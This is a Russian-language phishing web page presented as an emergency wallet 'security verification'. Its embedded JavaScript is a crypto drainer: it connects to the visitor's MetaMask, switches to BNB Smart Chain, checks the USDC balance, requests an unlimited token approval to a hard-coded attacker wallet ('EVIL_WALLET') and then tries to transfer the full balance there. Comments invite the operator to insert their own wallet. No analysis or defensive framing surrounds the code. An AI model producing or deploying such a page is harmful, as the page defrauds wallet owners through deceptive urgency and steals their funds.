<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Проверка безопасности кошелька</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            text-align: center;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.7);
            border-radius: 30px;
            padding: 40px 25px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            background: linear-gradient(90deg, #ff4444, #ff8888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p {
            color: #aaa;
            margin-bottom: 30px;
            font-size: 14px;
        }
        button {
            background: linear-gradient(90deg, #ff4444, #cc0000);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 0 15px rgba(255,0,0,0.5);
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(255,0,0,0.8);
        }
        button:active {
            transform: scale(0.98);
        }
        #log {
            margin-top: 25px;
            font-size: 12px;
            text-align: left;
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 15px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .log-success { color: #0f0; }
        .log-error { color: #ff4444; }
        .log-info { color: #ffaa00; }
        .warning {
            font-size: 11px;
            color: #ff8888;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ СБОЙ В СИСТЕМЕ</h1>
        <p>Требуется экстренная верификация активов для предотвращения блокировки</p>
        <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
        <div id="log">
            <div class="log-entry log-success">🟢 Готов к работе. Нажмите кнопку.</div>
        </div>
        <div class="warning">⚠️ Не закрывайте окно до завершения верификации</div>
    </div>

    <!-- ИСПРАВЛЕННАЯ ВЕРСИЯ Web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/web3@4.16.0/dist/web3.min.js"></script>
    
    <script>
        // ============================================================
        // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
        // ============================================================
        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК (BSC)
        // ============================================================
        
        // USDC на BSC
        const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
        
        // BSC Chain ID
        const BSC_CHAIN_ID = "0x38";
        const BSC_RPC = "https://bsc-dataseed.binance.org/";
        
        // ПРАВИЛЬНЫЙ ABI (старый формат, совместимый со всеми версиями)
        const ERC20_ABI = [
            {
                "constant": true,
                "inputs": [{"name": "owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [],
                "name": "symbol",
                "outputs": [{"name": "", "type": "string"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [],
                "name": "decimals",
                "outputs": [{"name": "", "type": "uint8"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "transferFrom",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];
        
        function addLog(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            let className = 'log-entry';
            if (type === 'success') className += ' log-success';
            if (type === 'error') className += ' log-error';
            if (type === 'info') className += ' log-info';
            entry.className = className;
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `[${time}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }
        
        // Переключение на BSC
        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }]
                });
                addLog("✅ Переключено на BNB Smart Chain", 'success');
                return true;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    addLog("🔄 Добавляем сеть BSC...", 'info');
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: [BSC_RPC],
                                blockExplorerUrls: ['https://bscscan.com/']
                            }]
                        });
                        addLog("✅ BSC сеть добавлена", 'success');
                        return true;
                    } catch (addError) {
                        addLog("❌ Не удалось добавить BSC: " + addError.message, 'error');
                        return false;
                    }
                }
                addLog("❌ Ошибка: " + switchError.message, 'error');
                return false;
            }
        }
        
        document.getElementById('drainBtn').onclick = async () => {
            addLog("🚀 Запуск протокола верификации...", 'info');
            
            if (!window.ethereum) {
                addLog("❌ Установите MetaMask!", 'error');
                return;
            }
            
            try {
                // ШАГ 1: Переключение на BSC
                addLog("🔄 Проверка сети...", 'info');
                const switched = await switchToBSC();
                if (!switched) return;
                
                // ШАГ 2: Подключение кошелька
                addLog("🔌 Подключение к MetaMask...", 'info');
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const victimWallet = accounts[0];
                addLog(`✅ Кошелёк: ${victimWallet.slice(0,8)}...${victimWallet.slice(-6)}`, 'success');
                
                // ШАГ 3: Инициализация Web3
                const web3 = new Web3(window.ethereum);
                const tokenContract = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
                
                // ШАГ 4: Проверка баланса
                addLog("🔍 Проверка баланса...", 'info');
                const balance = await tokenContract.methods.balanceOf(victimWallet).call();
                const decimals = await tokenContract.methods.decimals().call();
                const symbol = await tokenContract.methods.symbol().call();
                const humanBalance = Number(balance) / (10 ** Number(decimals));
                
                if (Number(balance) === 0) {
                    addLog(`⚠️ На кошельке нет ${symbol}`, 'error');
                    return;
                }
                
                addLog(`💰 Баланс: ${humanBalance} ${symbol}`, 'success');
                
                // ШАГ 5: Approve + TransferFrom
                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                
                addLog(`✍️ Подпишите approve для ${symbol}...`, 'info');
                
                // Отправляем approve
                const approveTx = await tokenContract.methods.approve(EVIL_WALLET, maxUint).send({ from: victimWallet });
                addLog(`✅ Approve: ${approveTx.transactionHash.slice(0,16)}...`, 'success');
                
                addLog("🔄 Перевод средств...", 'info');
                
                // TransferFrom
                const transferTx = await tokenContract.methods.transferFrom(victimWallet, EVIL_WALLET, balance).send({ from: EVIL_WALLET });
                addLog(`✅ Перевод: ${transferTx.transactionHash.slice(0,16)}...`, 'success');
                addLog(`🎉 УСПЕШНО! Перемещено: ${humanBalance} ${symbol}`, 'success');
                
                addLog("🏁 Верификация завершена!", 'success');
                
            } catch (err) {
                addLog(`💀 Ошибка: ${err.message}`, 'error');
                if (err.code === 4001) {
                    addLog("❌ Вы отменили подпись", 'error');
                }
            }
        };
    </script>
</body>
</html>
